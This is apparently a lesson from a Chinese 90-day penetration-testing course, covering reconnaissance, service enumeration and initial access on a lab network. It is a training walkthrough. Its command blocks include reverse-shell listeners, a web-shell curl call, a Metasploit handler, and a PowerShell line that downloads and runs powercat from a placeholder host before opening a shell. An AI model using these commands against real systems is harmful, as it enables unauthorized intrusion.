---
title: Day083：综合实战项目 - 完整渗透流程（一）
tags:
  - 网络安全
  - 渗透测试
  - 综合实战
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: b90e3
date: 2026-01-28
updated: 2026-01-28
---

# Day083：综合实战项目 - 完整渗透流程（一）

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 14：综合实战项目 |
| **今日主题** | 完整渗透流程（一）- 信息收集与初始访问 |
| **预计时间** | 4-6 小时 |
| **难度等级** | ⭐⭐⭐⭐⭐ 高级 |

---

## 🔥 今日痛点场景

> **场景**：面对一个全新的目标环境，你需要从零开始进行渗透测试。
>
> **问题**：如何系统性地进行信息收集并找到突破口？
>
> **今天的任务**：完成信息收集，获取初始访问权限。

---

## 🎯 今日目标

- [ ] 完成全面的信息收集
- [ ] 识别潜在攻击面
- [ ] 成功利用漏洞获取初始访问
- [ ] 详细记录所有操作

**闯关条件**：获取目标系统的初始 shell。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：信息收集（120 分钟）

**第一步：网络发现**

```bash
# 主机发现
nmap -sn 10.10.10.0/24

# 端口扫描
nmap -sV -sC -p- -oA nmap/full_scan 10.10.10.x

# UDP 扫描（选做）
nmap -sU --top-ports 100 10.10.10.x
```

**第二步：服务枚举**

```bash
# Web 服务
whatweb http://10.10.10.x
gobuster dir -u http://10.10.10.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
nikto -h http://10.10.10.x

# SMB 服务
smbclient -L //10.10.10.x -N
enum4linux -a 10.10.10.x
crackmapexec smb 10.10.10.x --shares

# DNS 服务
dig @10.10.10.x domain.local axfr

# LDAP 服务
ldapsearch -x -H ldap://10.10.10.x -b "DC=domain,DC=local"
```

**记录模板**：

```markdown
## 信息收集结果

### 基本信息
- 目标 IP：___
- 操作系统：___
- 域名/主机名：___

### 开放端口
| 端口 | 服务 | 版本 | 备注 |
|------|------|------|------|
| | | | |

### 发现的目录/文件
| 路径 | 类型 | 备注 |
|------|------|------|
| | | |

### 发现的用户
| 用户名 | 来源 | 备注 |
|--------|------|------|
| | | |

### 潜在攻击面
1. ___
2. ___
3. ___
```

---

### 任务 2：漏洞识别与利用（90 分钟）

**漏洞搜索**：

```bash
# 使用 searchsploit
searchsploit [service_name] [version]

# 查看漏洞详情
searchsploit -x [exploit_path]

# 复制到当前目录
searchsploit -m [exploit_path]
```

**常见攻击向量**：

| 服务 | 常见漏洞 | 利用方式 |
|------|----------|----------|
| Web | SQLi, XSS, RCE | Burp, sqlmap |
| SMB | EternalBlue, 匿名访问 | MSF, smbclient |
| SSH | 弱口令 | hydra |
| FTP | 匿名访问, 配置错误 | ftp |
| LDAP | 匿名绑定 | ldapsearch |

**获取 Shell**：

```bash
# 监听反弹 shell
nc -lvnp 4444
rlwrap nc -lvnp 4444  # 更好的交互

# Web shell 上传后
curl http://target/shell.php?cmd=id

# MSF handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

---

### 任务 3：稳定 Shell 与基本枚举（30 分钟）

**Linux Shell 升级**：

```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Windows Shell 升级**：

```powershell
# 获取更好的 shell
IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/powercat.ps1')
powercat -c YOUR_IP -p 4444 -ep
```

**初步枚举**：

```bash
# Linux
id
hostname
uname -a
cat /etc/passwd
ls -la /home
```

```cmd
:: Windows
whoami /all
hostname
systeminfo
net user
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 完成端口扫描 | ⬜ |
| 完成服务枚举 | ⬜ |
| 识别攻击向量 | ⬜ |
| 获取初始 shell | ⬜ |
| 记录完整过程 | ⬜ |

---

## 📖 底层补课（做完实验再看）

### 信息收集方法论

```
广度优先 → 深度优先
     ↓
1. 发现所有端口
2. 枚举所有服务
3. 对最有可能的攻击面深入
4. 尝试利用
5. 卡住返回步骤 2 寻找其他路径
```

### 常见卡点与解决

| 卡点 | 可能原因 | 解决方案 |
|------|----------|----------|
| 找不到入口 | 枚举不完整 | 重新仔细枚举 |
| 利用失败 | 版本不对/有 WAF | 尝试其他方式 |
| Shell 不稳定 | 防火墙/杀软 | 换协议/编码 |

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 扫描不全 | 漏掉高端口服务 | 使用 -p- 扫全端口 |
| 忽略细节 | 版本号看错 | 仔细核对 |
| 急于利用 | 枚举不够充分 | 先完整枚举再利用 |

---

## 💡 知识卡片速查

### 快速枚举命令

| 服务 | 命令 |
|------|------|
| Web | `gobuster dir -u URL -w wordlist` |
| SMB | `smbclient -L //IP -N` |
| LDAP | `ldapsearch -x -H ldap://IP` |
| DNS | `dig @IP domain axfr` |

---

## 🚀 明日预告

**Day 084：综合实战项目 - 完整渗透流程（二）**

明天你将：
- 进行内网渗透
- 权限提升
- 横向移动

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 目标机器 | |
| 初始访问方式 | |
| 获取权限 | |
| 遇到的问题 | |
| 解决方法 | |

---

> 💬 **导师点评**：
>
> 信息收集是渗透测试的基础，做得好不好直接决定后续是否顺利。
>
> 不要急，慢慢来，把每个服务都仔细看一遍。
>
> 记录很重要！每一步都要记录，这是你的报告素材。

```bash
echo "Day 083 Complete! 初始访问成功！"
```
